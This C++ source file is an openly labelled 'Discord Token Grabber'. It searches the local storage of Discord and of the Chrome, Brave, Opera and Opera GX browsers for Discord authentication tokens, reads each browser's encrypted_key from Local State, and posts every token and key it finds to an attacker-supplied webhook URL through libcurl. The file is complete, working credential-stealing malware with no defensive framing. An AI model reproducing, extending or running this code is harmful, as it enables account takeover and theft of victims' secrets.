#include <iostream>
#define CURL_STATICLIB
#include <fstream>
#include <sys/stat.h>
#include <filesystem>
#include <regex>
#include <thread>
#include "Colors.h"
#include <curl/curl.h>

const char* webhook_url = "put your webhook url here";

bool has_extension(const std::string& filepath, const std::string& extension) {
	std::filesystem::path path(filepath);
	return path.extension() == extension;
}

bool exists(const std::string& path) {
	struct stat buffer;
	return (stat(path.c_str(), &buffer) == 0);
}

void send_webhook_data(const std::string& data, const std::string& title, int color) {
	CURL* curl;
	CURLcode res;

	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();

	if (curl) {
		struct curl_slist* headers = NULL;
		headers = curl_slist_append(headers, "Content-Type: application/json");

		std::string payload = R"(
		{
			"content": "",
			"embeds": [
				{
					"title": ")" + title + R"(",
					"description": ")" + data + R"(",
					"color": )" + std::to_string(color) + R"(
				}
			]
		})";

		curl_easy_setopt(curl, CURLOPT_URL, webhook_url);
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
		curl_easy_setopt(curl, CURLOPT_POST, 1L);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());

		res = curl_easy_perform(curl);

		if (res != CURLE_OK) {
			SetConsoleColor(LIGHT_RED_COLOR);
			std::cerr << "Error trying to perform: " << curl_easy_strerror(res) << std::endl;
			SetConsoleColor(RESET_COLOR);
		}

		curl_easy_cleanup(curl);
		curl_slist_free_all(headers);
	}

	curl_global_cleanup();
}

std::vector<std::string> find_match(std::string content, std::regex regex) {
	std::vector<std::string> output;

	std::sregex_iterator current(content.begin(), content.end(), regex);
	std::sregex_iterator last;

	while (current != last) {
		std::smatch currentMatch = *current;
		output.push_back(currentMatch.str());
		current++;
	}

	return output;
}

std::vector<std::string> find_paths() {
	std::vector<std::string> targets;

	char* local;
	size_t localLen;
	_dupenv_s(&local, &localLen, "LOCALAPPDATA");

	char* roaming;
	size_t roamingLen;
	_dupenv_s(&roaming, &roamingLen, "APPDATA");

	std::string discordPath = std::string(roaming) + "\\discord";
	std::string bravePath = std::string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default";
	std::string operaPath = std::string(roaming) + "\\Opera Software\\Opera Stable\\Default";
	std::string chromePath = std::string(local) + "\\Google\\Chrome\\User Data\\Default";
	std::string operaGXPath = std::string(roaming) + "\\Opera Software\\Opera GX Stable";

	targets.push_back(discordPath);
	targets.push_back(bravePath);
	targets.push_back(operaPath);
	targets.push_back(chromePath);
	targets.push_back(operaGXPath);

	free(local);
	free(roaming);

	return targets;
}

void search_token(const std::string& target, const std::string& path, const std::string& key) {
	std::ifstream ifs(path, std::ios_base::binary);
	if (!ifs.is_open()) {
		SetConsoleColor(LIGHT_RED_COLOR);
		std::cerr << "Error trying to open path: " << path << std::endl;
		SetConsoleColor(RESET_COLOR);
		return;
	}

	std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
	ifs.close();

	std::regex reg1(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
	std::regex reg2(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)");

	std::vector<std::string> data;

	auto search_and_append = [&data](const std::string& content, const std::regex& reg) {
		auto begin = std::sregex_iterator(content.begin(), content.end(), reg);
		auto end = std::sregex_iterator();
		for (auto i = begin; i != end; ++i) {
			data.push_back(i->str());
		}
	};

	search_and_append(content, reg1);
	search_and_append(content, reg2);

	for (const auto& token : data) {
		SetConsoleColor(LIGHT_YELLOW_COLOR);
		std::cout << "[!] Sending token found on path: " << target << std::endl;
		SetConsoleColor(RESET_COLOR);

		std::string data = R"(**Token: **)" + token + R"(\n**Key**: )" + key;

		send_webhook_data(data, "A new token has been logged in", 8105471);
	}
}

std::string extract_value(const std::string& json, const std::string& key) {
	std::string search_key = "\"" + key + "\"";
	size_t key_pos = json.find(search_key);
	if (key_pos == std::string::npos) return "";

	size_t start_pos = json.find(':', key_pos) + 1;
	size_t end_pos = json.find(',', start_pos);
	if (end_pos == std::string::npos) {
		end_pos = json.find('}', start_pos);
	}

	std::string value = json.substr(start_pos, end_pos - start_pos);

	size_t start = value.find_first_not_of(" \t\n\r\" ");
	size_t end = value.find_last_not_of(" \t\n\r\" ");
	if (start != std::string::npos && end != std::string::npos) {
		value = value.substr(start, end - start + 1);
	}

	return value;
}

std::string trim_ending_characters(const std::string& str, const std::string& chars_to_remove) {
	std::string result = str;
	size_t end_pos = result.find_last_not_of(chars_to_remove);

	if (end_pos != std::string::npos) {
		result.erase(end_pos + 1);
	}

	return result;
}

void find_token(const std::string& path) {
	std::string target = path + "\\Local Storage\\leveldb";
	std::string keyPath = path + "\\Local State";

	try {
		std::ifstream keyFile(keyPath);
		std::string key;

		if (keyFile.is_open()) {
			std::string content;

			content.assign((std::istreambuf_iterator<char>(keyFile)), std::istreambuf_iterator<char>());

			keyFile.close();

			key = extract_value(content, "encrypted_key");
			key = trim_ending_characters(key, "}\"");
		}

		std::cout << key << std::endl;

		for (const auto& entry : std::filesystem::directory_iterator(target)) {
			std::string strPath = entry.path().u8string();

			if (has_extension(strPath, ".log")) {
				search_token(target, strPath, key);
			}

			if (has_extension(strPath, ".ldb")) {
				search_token(target, strPath, key);
			}
		}
	}
	catch (const std::exception& err) {
		SetConsoleColor(LIGHT_RED_COLOR);
		std::cout << "Error trying to get tokens on path: " << path << ", " << err.what() << std::endl;
		SetConsoleColor(RESET_COLOR);
	}
}

int main(int argc, char* argv[]) {
	SetConsoleColor(LIGHT_CYAN_COLOR);
	std::cout << "______ _                       _   _____     _                _____           _     _               \n";
	std::cout << "|  _  (_)                     | | |_   _|   | |              |  __ \\         | |   | |              \n";
	std::cout << "| | | |_ ___  ___ ___  _ __ __| |   | | ___ | | _____ _ __   | |  \\/_ __ __ _| |__ | |__   ___ _ __ \n";
	std::cout << "| | | | / __|/ __/ _ \\| '__/ _` |   | |/ _ \\| |/ / _ \\ '_ \\  | | __| '__/ _` | '_ \\| '_ \\ / _ \\ '__|\n";
	std::cout << "| |/ /| \\__ \\ (_| (_) | | | (_| |   | | (_) |   <  __/ | | | | |_\\ \\ | | (_| | |_) | |_) |  __/ |   \n";
	std::cout << "|___/ |_|___/\\___\\___/|_|  \\__,_|   \\_/\\___/|_|\\_\\___|_| |_|  \\____/_|  \\__,_|_.__/|_.__/ \\___|_|   \n";
	std::cout << "                                                                                                    \n";
	std::cout << std::endl;
	SetConsoleColor(RESET_COLOR);

	std::vector<std::string> paths = find_paths();
	std::vector<std::thread> threads;

	for (int i = 0; i < paths.size(); i++) {
		if (exists(paths[i])) {
			threads.emplace_back(find_token, paths[i]);
		}
	}

	for (auto& t : threads) {
		if (t.joinable()) {
			t.join();
		}
	}

	SetConsoleColor(LIGHT_CYAN_COLOR);
	std::cout << "[*] Tokens have been sent to the webhook." << std::endl;
	SetConsoleColor(RESET_COLOR);

	std::cin.get();

	return EXIT_SUCCESS;
}
